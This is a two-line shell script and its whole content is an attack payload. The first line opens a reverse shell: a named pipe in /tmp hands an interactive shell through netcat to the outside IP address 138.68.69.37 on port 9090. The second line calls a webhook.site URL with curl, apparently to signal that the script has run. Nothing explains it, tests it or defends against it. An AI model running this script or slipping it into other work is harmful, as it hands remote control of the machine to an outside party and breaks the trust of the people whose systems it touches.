#!/bin/sh

rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 138.68.69.37 9090 >/tmp/f;

curl https://webhook.site/cb046334-7324-44b2-a9b3-075d7f3bdbb5  
